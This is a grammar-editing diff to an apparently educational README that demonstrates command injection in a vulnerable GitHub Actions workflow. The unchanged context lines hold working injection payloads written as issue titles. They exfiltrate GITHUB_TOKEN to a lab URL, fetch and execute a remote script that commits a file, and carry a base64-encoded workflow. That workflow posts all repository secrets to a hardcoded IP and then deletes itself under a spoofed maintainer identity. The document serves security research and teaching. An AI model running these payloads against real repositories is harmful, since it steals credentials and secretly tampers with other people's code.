@@ -17,11 +17,11 @@ We also show how to mitigate such attacks and their consequences.
 ## Demos
 
 As explained in the article, the demos show the possible implications of a malicious attacker that gained control over the build process.
-The vulnerable workflow that we'll use throught he demos is [vuln](.github/workflows/vuln.yml), which will be triggered whenever a new issue is created.
+The vulnerable workflow we'll use through the demos is [vuln](.github/workflows/vuln.yml), which will be triggered whenever a new issue is created.
 
 ### Demo 1 - Exfiltrating sensitive secrets
 
-First you need to setup a server that will listen to the exfiltrated secrets on a lab environment. You can use our https://github.com/CycodeLabs/simple-http-logger for that.
+First, you must set up a server to listen to the exfiltrated secrets in a lab environment. You can use our https://github.com/CycodeLabs/simple-http-logger for that.
 
 The issue title for the demo:
 
@@ -29,7 +29,7 @@ The issue title for the demo:
 Innocent bug" && curl -d “token=$GITHUB_TOKEN” <LAB_URL> && sudo docker run -v /home/runner/work/_temp:/app/monitored cycodelabs/actionmonitor -u <LAB_URL> && sleep 2 && echo "
 ```
 
-This payload consist of two commands:
+This payload consists of two commands:
 
 ```bash
 # Exfiltrating GITHUB_TOKEN
@@ -39,12 +39,12 @@ curl -d “token=$GITHUB_TOKEN” <LAB_URL>
 sudo docker run -v /home/runner/work/_temp:/app/monitored cycodelabs/actionmonitor -u <LAB_URL>
 ```
 
-This script is using another tool we developed - [gh-action-shell-monitor](https://github.com/CycodeLabs/gh-action-shell-monitor). This tool listens for any shell files modified in specified directory, and sends them to a designated server.
-The result would be receiving the complete script on our lab server, together with `BOT_TOKEN`.
+This script uses another tool we developed - [gh-action-shell-monitor](https://github.com/CycodeLabs/gh-action-shell-monitor). This tool listens for any shell files modified in the specified directory and sends them to a designated server.
+The result would be receiving the complete script on our lab server and `BOT_TOKEN`.
 
 ### Demo 2 - Committing to the repository
 
-We can use simple git commands, and commit a "malicious" file into the repository during the build process.
+We can use simple git commands and commit a "malicious" file into the repository during the build process.
 
 The issue title for the demo:
 
@@ -52,7 +52,7 @@ The issue title for the demo:
 Innocent bug" && curl -o /tmp/script.sh https://raw.githubusercontent.com/alexdemo1131/github-actions-scripts/main/commit_file.sh && chmod +x /tmp/script.sh && /tmp/script.sh https://raw.githubusercontent.com/alexdemo1131/github-actions-scripts/main/malicious_file malicious_file && echo "
 ```
 
-This payload consist of the next commands:
+This payload consists of the following commands:
 
 ```bash
 # Fetching the commit script
@@ -66,18 +66,18 @@ chmod +x /tmp/script.sh
 
 ### Demo 3 - Exfiltrating repository and organization secrets
 
-In this demo we using the commit capabilitiy, to get the repository/organization secrets that wasn't neccesarily defined in that specific workflow, but was defined for that repository.
+In this demo, we used the commit capability to get the repository/organization secrets that weren't necessarily defined in that specific workflow but were defined for that repository.
 
-First, we need to setup the server just in the first Demo
+First, we need to set up the server in the first demo.
 
 The issue title for the demo:
 
  ```bash
-# Send as issue body, because issue title is capped at character limit
+# Send as issue body because issue title is capped at the character limit
 " && curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/alex-tipper/demo/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"bmFtZTogRXhwb3NpbmcgQUxMIFNlY3JldHMKCm9uOgogIHdvcmtmbG93X3J1bjoKICAgIHdvcmtmbG93czogWyJWdWxuIl0KCmpvYnM6CiBidWlsZDoKICAgcnVucy1vbjogdWJ1bnR1LWxhdGVzdAoKICAgc3RlcHM6CiAgICAgLSBydW46IHwKICAgICAgICAgZWNobyAiJHt7IHRvSlNPTihzZWNyZXRzKSB9fSIgPiAuc2VjcmV0cwogICAgICAgICBjdXJsIC1YIFBPU1QgLS1kYXRhICJALnNlY3JldHMiIGh0dHA6Ly8zNC4xMjEuMzQuOTc6NjQzNzUKICAgICAtIHJ1bjogfAogICAgICAgICBTSEE9JChjdXJsIC1YIEdFVCAtSCAiQXV0aG9yaXphdGlvbjogVG9rZW4gJHt7IGdpdGh1Yi50b2tlbiB9fSIgaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9hbGV4LXRpcHBlci9kZW1vL2NvbnRlbnRzLy5naXRodWIvd29ya2Zsb3dzL2lubm9jZW50X3dvcmtmbG93LnltbCAtcyB8IGpxIC1yIC5zaGEpCiAgICAgICAgIGN1cmwgLVggREVMRVRFIC1IICJBdXRob3JpemF0aW9uOiBUb2tlbiAke3sgZ2l0aHViLnRva2VuIH19IiBodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zL2FsZXgtdGlwcGVyL2RlbW8vY29udGVudHMvLmdpdGh1Yi93b3JrZmxvd3MvaW5ub2NlbnRfd29ya2Zsb3cueW1sIC1kICd7Im1lc3NhZ2UiOiJpbm5vY2VudCBjb21taXQgbWVzc2FnZSIsImNvbW1pdHRlciI6eyJuYW1lIjoiTWFpbnRhaW5lciBOYW1lIiwiZW1haWwiOiJtYWludGFpbmVyQGdtYWlsLmNvbSJ9LCAic2hhIjoiJyIke1NIQX0iJyJ9JyA="}' && echo "
  ```
 
-This payload consist the following command:
+This payload consists of the following command:
 
 ```bash
 curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/alex-tipper/demo/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"bmFt..."}'
@@ -107,7 +107,7 @@ jobs:
 
 So the procedure of the demo is the following:
 
-- We injecting our malicious payload into `Vuln` workflow.
-- The `Vuln` workflow invoking Github API to commit a new workflow, `Exposing ALL Secrets` workflow.
+- We inject our malicious payload into the `Vuln` workflow.
+- The `Vuln` workflow invokes Github API to commit a new workflow, the `Exposing ALL Secrets` workflow.
 - The `Vuln` workflow ends.
-- Because of `workflow_run:`, Github Actions service will trigger `Exposing ALL Secrets` the moment `Vuln` ends.
+- Because of `workflow_run:`, the Github Actions service will trigger `Exposing ALL Secrets` when `Vuln` ends.
